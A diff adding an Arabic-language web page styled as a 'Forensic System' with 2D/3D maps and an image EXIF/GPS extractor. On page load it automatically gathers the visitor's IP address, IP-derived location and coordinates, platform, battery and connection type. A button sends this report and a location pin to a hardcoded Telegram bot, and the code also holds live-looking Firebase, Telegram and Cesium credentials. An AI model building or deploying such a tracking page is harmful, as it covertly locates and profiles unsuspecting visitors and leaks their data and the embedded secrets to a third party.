@@ -1,1 +1,766 @@
-hdhehrheehehhrhrjrjrrr
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FORENSIC SYSTEM v6.0 | 3D MAP + IMAGE ANALYSIS</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+    <script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
+    <script src="https://cesium.com/downloads/cesiumjs/releases/1.109/Build/Cesium/Cesium.js"></script>
+    <link href="https://cesium.com/downloads/cesiumjs/releases/1.109/Build/Cesium/Widgets/widgets.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Share Tech Mono', monospace; }
+
+        :root {
+            --primary: #00ff41; --secondary: #008f11; --dark: #003b00;
+            --black: #000000; --alert: #ff0040; --warning: #ffaa00;
+        }
+
+        body {
+            background: var(--black); color: var(--primary); min-height: 100vh;
+            overflow-x: hidden; position: relative;
+        }
+
+        .matrix-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; opacity: 0.1;
+        }
+
+        .scan-line {
+            position: fixed; top: 0; left: 0; width: 100%; height: 2px;
+            background: var(--primary); box-shadow: 0 0 10px var(--primary);
+            animation: scan 3s linear infinite; z-index: 9999; pointer-events: none;
+        }
+
+        @keyframes scan { 0% { transform: translateY(-100vh); } 100% { transform: translateY(100vh); } }
+
+        .glow-border {
+            position: relative; border: 1px solid var(--primary);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3), inset 0 0 20px rgba(0, 255, 65, 0.1);
+        }
+
+        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
+
+        .header {
+            text-align: center; padding: 30px 0; border-bottom: 2px solid var(--primary);
+            margin-bottom: 30px; position: relative; overflow: hidden;
+        }
+        .header h1 { font-size: 2rem; text-shadow: 0 0 20px var(--primary); margin-bottom: 10px; }
+        .header .subtitle { color: var(--secondary); font-size: 0.8rem; letter-spacing: 3px; }
+
+        .status-bar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px; background: rgba(0, 20, 0, 0.8); border: 1px solid var(--primary);
+            margin-bottom: 20px; flex-wrap: wrap; gap: 10px;
+        }
+
+        .status-item { display: flex; align-items: center; gap: 10px; }
+        .status-indicator { width: 12px; height: 12px; border-radius: 50%; animation: blink 1s infinite; }
+        .status-indicator.active { background: var(--primary); box-shadow: 0 0 10px var(--primary); }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .progress-container {
+            width: 100%; height: 30px; background: rgba(0, 20, 0, 0.8);
+            border: 1px solid var(--primary); margin-bottom: 20px; position: relative; overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%; background: linear-gradient(90deg, var(--dark), var(--primary));
+            width: 0%; transition: width 0.5s ease; display: flex; align-items: center;
+            justify-content: center; color: var(--black); font-weight: bold;
+        }
+
+        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; margin-bottom: 20px; }
+
+        .data-card {
+            background: rgba(0, 20, 0, 0.6); border: 1px solid var(--secondary);
+            padding: 15px; position: relative; overflow: hidden; transition: all 0.3s;
+        }
+
+        .data-card:hover { border-color: var(--primary); box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); transform: translateY(-2px); }
+        .data-card.critical { border-color: var(--alert); box-shadow: 0 0 15px rgba(255, 0, 64, 0.3); }
+
+        .data-label { color: var(--secondary); font-size: 0.7rem; margin-bottom: 5px; text-transform: uppercase; }
+        .data-value { color: var(--primary); font-size: 0.95rem; font-weight: bold; word-break: break-all; }
+
+        /* 3D Map Container */
+        #cesiumContainer {
+            width: 100%; height: 500px; border: 2px solid var(--primary);
+            margin-bottom: 20px; border-radius: 5px; overflow: hidden;
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .map-toggle {
+            display: flex; gap: 10px; margin-bottom: 10px;
+        }
+        .map-toggle button {
+            flex: 1; padding: 10px; background: transparent; border: 1px solid var(--primary);
+            color: var(--primary); cursor: pointer; font-weight: bold; transition: all 0.3s;
+        }
+
+        .map-toggle button.active { background: var(--primary); color: var(--black); }
+
+        /* Image Analysis Section */
+        .image-section {
+            background: rgba(0, 20, 0, 0.8); border: 2px solid var(--warning);
+            padding: 20px; margin-bottom: 20px; border-radius: 5px;
+        }
+
+        .image-section h2 {
+            color: var(--warning); margin-bottom: 15px; font-size: 1.3rem;
+            text-shadow: 0 0 10px var(--warning);
+        }
+
+        .file-input-wrapper {
+            position: relative; overflow: hidden; display: inline-block; width: 100%;
+        }
+
+        .file-input-wrapper input[type=file] {
+            position: absolute; left: -9999px;
+        }
+
+        .file-input-label {
+            display: block; padding: 20px; background: rgba(255, 170, 0, 0.1);
+            border: 2px dashed var(--warning); text-align: center; cursor: pointer;
+            transition: all 0.3s; border-radius: 5px;
+        }
+
+        .file-input-label:hover {
+            background: rgba(255, 170, 0, 0.2);
+            box-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+        }
+
+        .file-input-label i { font-size: 3rem; margin-bottom: 10px; display: block; }
+
+        .image-preview {
+            max-width: 100%; max-height: 400px; margin: 20px auto;
+            display: none; border: 2px solid var(--primary); border-radius: 5px;
+        }
+
+        .analyze-btn {
+            width: 100%; padding: 15px; background: var(--warning); color: var(--black);
+            border: none; font-weight: bold; cursor: pointer; margin-top: 15px;
+            font-size: 1.1rem; text-transform: uppercase; letter-spacing: 2px;
+            transition: all 0.3s; border-radius: 5px;
+        }
+        .analyze-btn:hover {
+            background: #ffcc00; box-shadow: 0 0 30px var(--warning);
+        }
+
+        .analyze-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .image-metadata {
+            background: rgba(0, 0, 0, 0.5); padding: 15px; margin-top: 15px;
+            border-radius: 5px; display: none;
+        }
+
+        .metadata-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px; margin-top: 10px;
+        }
+
+        .metadata-item {
+            background: rgba(0, 255, 65, 0.05); padding: 10px; border-radius: 3px;
+            border-left: 3px solid var(--primary);
+        }
+
+        .metadata-label { color: var(--secondary); font-size: 0.75rem; margin-bottom: 5px; }
+        .metadata-value { color: var(--primary); font-weight: bold; }
+
+        .gps-warning {
+            background: rgba(255, 0, 64, 0.2); border: 1px solid var(--alert);
+            padding: 10px; margin-top: 10px; border-radius: 3px; display: none;
+            color: var(--alert);
+        }
+
+        .terminal {
+            background: rgba(0, 10, 0, 0.95); border: 1px solid var(--primary);
+            padding: 15px; height: 200px; overflow-y: auto; font-size: 0.7rem;
+            margin-bottom: 20px;
+        }
+
+        .log-line { margin: 3px 0; font-family: 'Courier New', monospace; }
+        .log-line.success { color: var(--primary); }
+        .log-line.error { color: var(--alert); }
+        .log-line.warn { color: var(--warning); }
+        .log-line.info { color: var(--secondary); }
+
+        .btn {
+            width: 100%; padding: 15px; background: transparent; border: 2px solid var(--primary);
+            color: var(--primary); font-weight: bold; cursor: pointer; margin-bottom: 10px;
+            transition: all 0.3s; text-transform: uppercase; letter-spacing: 2px;
+        }
+
+        .btn:hover { background: var(--primary); color: var(--black); box-shadow: 0 0 30px var(--primary); }
+        @media (max-width: 768px) {
+            .header h1 { font-size: 1.3rem; }
+            .data-grid { grid-template-columns: 1fr; }
+            #cesiumContainer { height: 300px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="scan-line"></div>
+    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header glow-border">
+            <h1>🛡️ FORENSIC SYSTEM v6.0</h1>
+            <div class="subtitle">خريطة 3D + تحليل الصور المتقدم</div>
+        </div>
+
+        <!-- Status Bar -->
+        <div class="status-bar glow-border">
+            <div class="status-item">
+                <div class="status-indicator" id="statusIndicator"></div>
+                <span id="statusText">جاري التهيئة...</span>
+            </div>
+            <div class="status-item">
+                <span>🕐 </span><span id="currentTime">--:--:--</span>
+            </div>
+            <div class="status-item">
+                <span>📡 </span><span id="connectionStatus">غير متصل</span>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-container glow-border">
+            <div class="progress-bar" id="progressBar">0%</div>
+        </div>
+
+        <!-- 3D Map Section -->
+        <div class="glow-border" style="padding: 15px; margin-bottom: 20px;">
+            <h2 style="color: var(--primary); margin-bottom: 10px;">🗺️ الخريطة ثلاثية الأبعاد</h2>
+            <div class="map-toggle">
+                <button onclick="switchMap('2d')" id="btn2d" class="active">📍 خريطة 2D</button>
+                <button onclick="switchMap('3d')" id="btn3d">🌍 خريطة 3D Globe</button>
+            </div>
+            <div id="map2d" style="height: 400px; display: block;"></div>
+            <div id="cesiumContainer" style="display: none;"></div>
+        </div>
+
+        <!-- Data Grid -->        <div class="data-grid" id="dataGrid">
+            <div class="data-card critical">
+                <div class="data-label">🌐 IP Address</div>
+                <div class="data-value" id="ip">جاري التحليل...</div>
+            </div>
+            <div class="data-card critical">
+                <div class="data-label">📍 Country</div>
+                <div class="value" id="country">-</div>
+            </div>
+            <div class="data-card critical">
+                <div class="data-label">🏙️ City</div>
+                <div class="value" id="city">-</div>
+            </div>
+            <div class="data-card critical">
+                <div class="data-label">🎯 Latitude</div>
+                <div class="value" id="lat">-</div>
+            </div>
+            <div class="data-card critical">
+                <div class="data-label">🎯 Longitude</div>
+                <div class="value" id="lng">-</div>
+            </div>
+            <div class="data-card">
+                <div class="data-label">💻 OS</div>
+                <div class="value" id="os">-</div>
+            </div>
+            <div class="data-card">
+                <div class="data-label">🔋 Battery</div>
+                <div class="value" id="batteryLevel">-</div>
+            </div>
+            <div class="data-card">
+                <div class="data-label">📡 Connection</div>
+                <div class="value" id="connectionType">-</div>
+            </div>
+        </div>
+
+        <!-- Image Analysis Section -->
+        <div class="image-section glow-border">
+            <h2>📸 تحليل الصور المتقدم - استخراج البيانات الوصفية</h2>
+            
+            <div class="file-input-wrapper">
+                <input type="file" id="imageInput" accept="image/*" onchange="handleImageSelect(event)">
+                <label for="imageInput" class="file-input-label">
+                    <span style="font-size: 3rem;">📁</span><br>
+                    <strong>اضغط هنا لاختيار صورة من المعرض</strong><br>
+                    <small>يدعم: JPG, JPEG, PNG, TIFF</small>
+                </label>
+            </div>
+
+            <img id="imagePreview" class="image-preview" alt="Preview">
+            <button class="analyze-btn" id="analyzeBtn" onclick="analyzeImage()" disabled>
+                🔍 فحص الصورة واستخراج البيانات
+            </button>
+
+            <div id="imageMetadata" class="image-metadata">
+                <h3 style="color: var(--primary); margin-bottom: 10px;">📊 بيانات الصورة المستخرجة:</h3>
+                <div class="metadata-grid" id="metadataGrid"></div>
+                <div id="gpsWarning" class="gps-warning">
+                    ⚠️ <strong>تحذير:</strong> هذه الصورة تحتوي على إحداثيات GPS! يمكن تحديد الموقع بدقة.
+                </div>
+            </div>
+        </div>
+
+        <!-- Terminal -->
+        <div class="terminal glow-border" id="console"></div>
+
+        <!-- Buttons -->
+        <button class="btn" onclick="collectData()">🔄 جمع البيانات الحالية</button>
+        <button class="btn" onclick="sendData()">📨 إرسال التقرير</button>
+    </div>
+
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+    <script>
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCVyg-EAtI-oumlWnBOVNKBjwufbTS6H5w",
+            authDomain: "onx-gp-aade0.firebaseapp.com",
+            databaseURL: "https://onx-gp-aade0-default-rtdb.firebaseio.com",
+            projectId: "onx-gp-aade0",
+            storageBucket: "onx-gp-aade0.firebasestorage.app",
+            messagingSenderId: "434498224932",
+            appId: "1:434498224932:web:7c3b1d6e28b90168e869b1",
+            measurementId: "G-M3K67GR34L"
+        };
+
+        const BOT_TOKEN = "7735965641:AAFzkUy27zKXYWroodhdxOBapMgwttyq5_s";
+        const CHAT_ID = "910624538";
+        
+        let data = {}, map2d = null, cesiumViewer = null;
+        let currentMap = '2d';
+        let selectedImage = null;
+        let imageExifData = {};
+
+        // Matrix Background
+        function initMatrix() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            const chars = '01 アイウエオカキクケコサシスセソタチツテト';
+            const charArray = chars.split('');
+            const fontSize = 14, columns = canvas.width / fontSize;
+            const drops = [];
+            for (let i = 0; i < columns; i++) drops[i] = Math.random() * -100;
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                ctx.fillStyle = '#0f0'; ctx.font = fontSize + 'px monospace';
+                for (let i = 0; i < drops.length; i++) {
+                    ctx.fillText(charArray[Math.floor(Math.random() * charArray.length)], i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                }
+            }
+            setInterval(drawMatrix, 35);
+        }
+
+        // Update Time
+        function updateTime() {
+            document.getElementById('currentTime').innerText = new Date().toLocaleTimeString('ar-SA');
+        }
+        setInterval(updateTime, 1000);
+
+        // Logging
+        function log(msg, type = 'info') {
+            const c = document.getElementById('console');
+            const l = document.createElement('div');
+            l.className = `log-line ${type}`;
+            l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            c.appendChild(l); c.scrollTop = c.scrollHeight;
+        }
+
+        // Update Progress
+        function updateProgress(percent, message) {
+            const bar = document.getElementById('progressBar');
+            bar.style.width = percent + '%';
+            bar.innerText = `${percent}% - ${message}`;
+        }
+
+        // Update Status
+        function updateStatus(text, type) {
+            const indicator = document.getElementById('statusIndicator');
+            document.getElementById('statusText').innerText = text;
+            indicator.className = 'status-indicator ' + (type === 'success' ? 'active' : type);
+        }
+
+        // Update Element
+        function updateElement(id, value) {            const el = document.getElementById(id);
+            if (el) { el.innerText = value || 'N/A'; }
+        }
+
+        // Switch between 2D and 3D maps
+        function switchMap(type) {
+            currentMap = type;
+            document.getElementById('btn2d').classList.toggle('active', type === '2d');
+            document.getElementById('btn3d').classList.toggle('active', type === '3d');
+            
+            if (type === '2d') {
+                document.getElementById('map2d').style.display = 'block';
+                document.getElementById('cesiumContainer').style.display = 'none';
+                if (map2d) map2d.invalidateSize();
+            } else {
+                document.getElementById('map2d').style.display = 'none';
+                document.getElementById('cesiumContainer').style.display = 'block';
+                if (!cesiumViewer) initCesium();
+                else cesiumViewer.resize();
+            }
+            log(`🗺️ تم التبديل إلى الخريطة ${type === '2d' ? '2D' : '3D'}`, 'info');
+        }
+
+        // Initialize 2D Map (Leaflet)
+        function init2DMap(lat = 24.7136, lng = 46.6753) {
+            if (map2d) return;
+            map2d = L.map('map2d').setView([lat, lng], 15);
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap'
+            }).addTo(map2d);
+            L.marker([lat, lng]).addTo(map2d).bindPopup('📍 الموقع المحدد').openPopup();
+            log('✓ خريطة 2D مهيأة', 'success');
+        }
+
+        // Initialize 3D Map (Cesium)
+        function initCesium(lat = 24.7136, lng = 46.6753) {
+            if (cesiumViewer) return;
+            
+            Cesium.Ion.defaultAccessToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJlYWE1OWUxNy1mMWZiLTQzYjYtYTQ0OS1kMWFjYmFjNjE5YzMiLCJpZCI6NTc3MzMsImlhdCI6MTYyNzg0NzQ3Mn0.XcKpgANiY19MC4bdFUXMVEBToBmqS8kuYpUlxJHYZxk';
+            
+            cesiumViewer = new Cesium.Viewer('cesiumContainer', {
+                terrainProvider: Cesium.createWorldTerrain(),
+                animation: false,
+                baseLayerPicker: true,
+                fullscreenButton: true,
+                geocoder: true,
+                homeButton: true,
+                infoBox: true,
+                sceneModePicker: true,
+                selectionIndicator: true,                timeline: false,
+                navigationHelpButton: true,
+                navigationInstructionsInitiallyVisible: false
+            });
+
+            cesiumViewer.camera.flyTo({
+                destination: Cesium.Cartesian3.fromDegrees(lng, lat, 1000),
+                orientation: {
+                    heading: Cesium.Math.toRadians(0),
+                    pitch: Cesium.Math.toRadians(-45),
+                    roll: 0
+                },
+                duration: 3
+            });
+
+            // Add marker
+            cesiumViewer.entities.add({
+                position: Cesium.Cartesian3.fromDegrees(lng, lat),
+                point: {
+                    pixelSize: 15,
+                    color: Cesium.Color.RED,
+                    outlineColor: Cesium.Color.WHITE,
+                    outlineWidth: 3
+                },
+                label: {
+                    text: '📍 Target Location',
+                    font: '14px monospace',
+                    style: Cesium.LabelStyle.FILL_AND_OUTLINE,
+                    outlineWidth: 2,
+                    verticalOrigin: Cesium.VerticalOrigin.BOTTOM,
+                    pixelOffset: new Cesium.Cartesian2(0, -9)
+                }
+            });
+
+            log('✓ خريطة 3D Cesium مهيأة', 'success');
+        }
+
+        // Image Selection Handler
+        function handleImageSelect(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            if (!file.type.startsWith('image/')) {
+                log('✗ الملف المحدد ليس صورة', 'error');
+                alert('الرجاء اختيار ملف صورة صالح');
+                return;
+            }
+
+            selectedImage = file;
+            const preview = document.getElementById('imagePreview');            const reader = new FileReader();
+
+            reader.onload = function(e) {
+                preview.src = e.target.result;
+                preview.style.display = 'block';
+                document.getElementById('analyzeBtn').disabled = false;
+                log(`✓ تم اختيار الصورة: ${file.name}`, 'success');
+            };
+
+            reader.readAsDataURL(file);
+        }
+
+        // Image Analysis - Extract EXIF Data
+        function analyzeImage() {
+            if (!selectedImage) {
+                log('✗ لم يتم اختيار صورة', 'error');
+                return;
+            }
+
+            log('🔍 جاري تحليل الصورة واستخراج البيانات...', 'info');
+            updateProgress(50, 'تحليل الصورة');
+
+            const reader = new FileReader();
+            
+            reader.onload = function(e) {
+                try {
+                    const img = new Image();
+                    img.onload = function() {
+                        // Extract basic image data
+                        imageExifData = {
+                            'اسم الملف': selectedImage.name,
+                            'نوع الملف': selectedImage.type,
+                            'الحجم': formatFileSize(selectedImage.size),
+                            'العرض': img.width + ' بكسل',
+                            'الارتفاع': img.height + 'بكسل',
+                            'تاريخ التحليل': new Date().toLocaleString('ar-SA')
+                        };
+
+                        // Try to extract EXIF data
+                        EXIF.getData(img, function() {
+                            const exif = EXIF.getAllTags(this);
+                            
+                            if (exif.GPSLatitude && exif.GPSLongitude) {
+                                const gpsData = extractGPSData(exif);
+                                imageExifData['📍 خط العرض (GPS)'] = gpsData.lat.toFixed(6);
+                                imageExifData['📍 خط الطول (GPS)'] = gpsData.lng.toFixed(6);
+                                imageExifData['🎯 دقة الموقع'] = 'عالية - GPS';
+                                
+                                // Show GPS warning
+                                document.getElementById('gpsWarning').style.display = 'block';                                
+                                // Add to map
+                                if (currentMap === '3d') {
+                                    initCesium(gpsData.lat, gpsData.lng);
+                                } else {
+                                    init2DMap(gpsData.lat, gpsData.lng);
+                                }
+                                
+                                log(`✓ تم استخراج إحداثيات GPS من الصورة: ${gpsData.lat}, ${gpsData.lng}`, 'success');
+                            }
+
+                            if (exif.DateTimeOriginal) {
+                                imageExifData['📅 تاريخ التصوير'] = exif.DateTimeOriginal;
+                            }
+                            if (exif.Make) {
+                                imageExifData['📷 الشركة المصنعة'] = exif.Make;
+                            }
+                            if (exif.Model) {
+                                imageExifData['📱 موديل الكاميرا'] = exif.Model;
+                            }
+                            if (exif.ISOSpeedRatings) {
+                                imageExifData['🔆 ISO'] = exif.ISOSpeedRatings;
+                            }
+                            if (exif.FNumber) {
+                                imageExifData['🔍 فتحة العدسة'] = 'f/' + exif.FNumber;
+                            }
+                            if (exif.ExposureTime) {
+                                imageExifData['⏱️ سرعة الغالق'] = exif.ExposureTime + ' ثانية';
+                            }
+                            if (exif.Flash) {
+                                imageExifData['💡 الفلاش'] = exif.Flash ? 'مستخدم' : 'غير مستخدم';
+                            }
+
+                            displayMetadata();
+                            updateProgress(100, 'اكتمل تحليل الصورة');
+                            log('✓ اكتمل استخراج بيانات الصورة', 'success');
+                        });
+                    };
+                    img.src = e.target.result;
+                } catch (error) {
+                    log('✗ فشل تحليل الصورة: ' + error.message, 'error');
+                    updateProgress(0, 'فشل التحليل');
+                }
+            };
+
+            reader.readAsArrayBuffer(selectedImage);
+        }
+
+        // Extract GPS coordinates from EXIF
+        function extractGPSData(exif) {            const convertDMSToDD = (degrees, minutes, seconds, direction) => {
+                let dd = degrees + minutes / 60 + seconds / 3600;
+                if (direction === "S" || direction === "W") {
+                    dd = dd * -1;
+                }
+                return dd;
+            };
+
+            const lat = exif.GPSLatitude;
+            const lng = exif.GPSLongitude;
+            const latRef = exif.GPSLatitudeRef || 'N';
+            const lngRef = exif.GPSLongitudeRef || 'E';
+
+            return {
+                lat: convertDMSToDD(lat[0], lat[1], lat[2], latRef),
+                lng: convertDMSToDD(lng[0], lng[1], lng[2], lngRef)
+            };
+        }
+
+        // Format file size
+        function formatFileSize(bytes) {
+            if (bytes < 1024) return bytes + ' بايت';
+            else if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' كيلوبايت';
+            else return (bytes / 1048576).toFixed(2) + ' ميجابايت';
+        }
+
+        // Display metadata
+        function displayMetadata() {
+            const grid = document.getElementById('metadataGrid');
+            grid.innerHTML = '';
+
+            for (const [key, value] of Object.entries(imageExifData)) {
+                const item = document.createElement('div');
+                item.className = 'metadata-item';
+                item.innerHTML = `
+                    <div class="metadata-label">${key}</div>
+                    <div class="metadata-value">${value}</div>
+                `;
+                grid.appendChild(item);
+            }
+
+            document.getElementById('imageMetadata').style.display = 'block';
+        }
+
+        // Collect Device Data
+        async function collectData() {
+            log('=== بدء جمع البيانات ===', 'warn');
+            updateStatus('جاري الجمع...', 'warning');
+            
+            // Get IP            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const ipData = await res.json();
+                data.ip = ipData.ip;
+                updateElement('ip', data.ip);
+                log(`✓ IP: ${data.ip}`, 'success');
+            } catch(e) {
+                log('✗ فشل جلب IP', 'error');
+            }
+
+            // Get location from IP
+            try {
+                const res = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const loc = await res.json();
+                data.country = loc.country_name;
+                data.city = loc.city;
+                data.lat = loc.latitude;
+                data.lng = loc.longitude;
+                updateElement('country', data.country);
+                updateElement('city', data.city);
+                updateElement('lat', data.lat);
+                updateElement('lng', data.lng);
+                
+                // Initialize maps
+                init2DMap(data.lat, data.lng);
+                if (currentMap === '3d') initCesium(data.lat, data.lng);
+                
+                log(`✓ الموقع: ${data.city}, ${data.country}`, 'success');
+            } catch(e) {
+                log('✗ فشل جلب الموقع', 'error');
+            }
+
+            // Device info
+            data.os = navigator.platform;
+            data.browser = navigator.userAgent.includes('Chrome') ? 'Chrome' : 
+                          navigator.userAgent.includes('Firefox') ? 'Firefox' : 'Unknown';
+            updateElement('os', data.os);
+            updateElement('browser', data.browser);
+
+            // Battery
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.battery = Math.round(battery.level * 100) + '%';
+                updateElement('batteryLevel', data.battery);
+            }
+
+            // Connection
+            if (navigator.connection) {
+                data.connection = navigator.connection.effectiveType;
+                updateElement('connectionType', data.connection);            }
+
+            updateProgress(100, 'اكتمل الجمع');
+            updateStatus('✅ اكتمل', 'success');
+            log('=== اكتمل جمع البيانات ===', 'success');
+        }
+
+        // Send to Telegram
+        async function sendData() {
+            log('📨 جاري الإرسال لتليجرام...', 'info');
+            
+            let msg = `🚨 *FORENSIC REPORT v6.0*\n\n`;
+            msg += `🌐 IP: \`${data.ip || 'N/A'}\`\n`;
+            msg += `📍 الموقع: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}\n`;
+            if (data.lat) msg += `🎯 GPS: ${data.lat}, ${data.lng}\n`;
+            msg += `💻 النظام: ${data.os || 'Unknown'}\n`;
+            msg += `🔋 البطارية: ${data.battery || 'N/A'}\n`;
+            msg += `📡 الاتصال: ${data.connection || 'Unknown'}\n`;
+            msg += `\n🕒 ${new Date().toLocaleString('ar-SA')}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (data.lat) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            latitude: parseFloat(data.lat),
+                            longitude: parseFloat(data.lng)
+                        })
+                    });
+                }
+
+                log('✓ تم الإرسال لتليجرام', 'success');
+                alert('✅ تم إرسال التقرير بنجاح!');
+            } catch(e) {
+                log('✗ فشل الإرسال', 'error');
+            }
+        }
+        // Initialize Firebase
+        function initFirebase() {
+            try {
+                firebase.initializeApp(firebaseConfig);
+                const db = firebase.database();
+                db.ref('.info/connected').on('value', snap => {
+                    const connected = snap.val() === true;
+                    document.getElementById('connectionStatus').innerText = connected ? 'متصل' : 'غير متصل';
+                    document.getElementById('connectionStatus').style.color = connected ? '#0f0' : '#f00';
+                });
+            } catch(e) {
+                log('✗ فشل Firebase', 'error');
+            }
+        }
+
+        // Auto-start
+        window.onload = function() {
+            initMatrix();
+            initFirebase();
+            init2DMap();
+            log('✅ النظام جاهز - Forensic System v6.0', 'success');
+            updateStatus('جاهز', 'success');
+            
+            // Auto-collect after 2 seconds
+            setTimeout(() => {
+                collectData();
+            }, 2000);
+        };
+    </script>
+</body>
+      </html>
